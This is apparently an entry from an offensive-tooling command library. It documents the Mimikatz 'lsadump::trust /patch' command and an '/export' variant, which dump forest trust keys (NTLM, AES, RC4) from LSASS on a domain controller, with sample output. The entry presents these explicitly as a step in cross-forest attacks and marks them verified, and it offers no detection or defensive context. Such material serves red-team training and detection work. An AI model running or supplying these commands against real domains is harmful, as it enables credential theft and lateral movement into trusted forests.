---
id: df18ab11-1b6f-4a2e-bc95-00661904c05b
name: mimikatz-lsadump-trust-extract
type: command
executor: cmd
data: 'lsadump::trust /patch'
output: null
created_at: '2023-04-06T03:56:07.292543+00:00'
updated_at: '2023-04-10T20:26:22.992467+00:00'
platforms:
  - Windows
tags:
  - active-directory
  - trust-dumping
verified: true
validated: true
---

# mimikatz-lsadump-trust-extract

## Command

```cmd
lsadump::trust /patch
```

## Description

This Mimikatz command extracts trust account authentication keys (NTLM, AES) from the LSASS process on a domain controller. It is used after elevating privileges in Mimikatz to dump forest trust credentials for cross-forest attacks. Run this within an active Mimikatz session with debug privileges.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| lsadump::trust | Module to dump LSA secrets related to trusts | Yes |
| /patch | Specifies extraction of trust patches/keys (AES/RC4) | Yes |

## Examples

### Basic Usage

```cmd
lsadump::trust /patch
```

This outputs all configured trusts and their keys.

### Advanced Usage

Combine with export for offline use:

```cmd
lsadump::trust /patch /export
```

Exports keys to a file for further processing.

## Expected Output

A formatted list of trusts:

```
Domain : contoso.com (CONTOSO/ contoso.com) 
TrustKey : * Trust: TRUST_NAME$ / AES128 : 01 23... / AES256 : 45 67... / RC4 : aad3b435b51404eeaad3b435b51404ee:5e4c...
```

Success is indicated by populated key fields without access denied errors.

## Related

- [[procedures/Forest-Trust-Ticket-Dumping]]
- [[tools/Mimikatz]]
